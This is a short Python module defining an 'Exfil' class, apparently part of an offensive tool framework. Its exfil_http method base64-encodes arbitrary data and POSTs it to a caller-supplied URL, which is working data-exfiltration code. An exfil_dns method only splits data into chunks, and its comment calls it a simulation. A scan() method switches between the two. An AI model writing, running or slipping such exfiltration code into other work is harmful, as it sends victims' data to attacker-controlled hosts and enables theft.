import base64
import requests

class Exfil:
    def __init__(self, engine):
        self.engine = engine
        self.priority = "P1"
        self.level = "Critical"

    def exfil_http(self, data, target_url):
        try:
            resp = requests.post(target_url, data={'data': base64.b64encode(data.encode()).decode()})
            return {'status': 'success', 'response': resp.status_code}
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}

    def exfil_dns(self, data, domain):
        # Simulasi DNS exfil (tampilkan data aja)
        chunks = [data[i:i+50] for i in range(0, len(data), 50)]
        return {'chunks': chunks, 'domain': domain}

    def scan(self, target, data, method="http"):
        if method == "http":
            return self.exfil_http(data, target)
        elif method == "dns":
            return self.exfil_dns(data, target)
        else:
            return {'error': 'Invalid method. Use "http" or "dns".'}
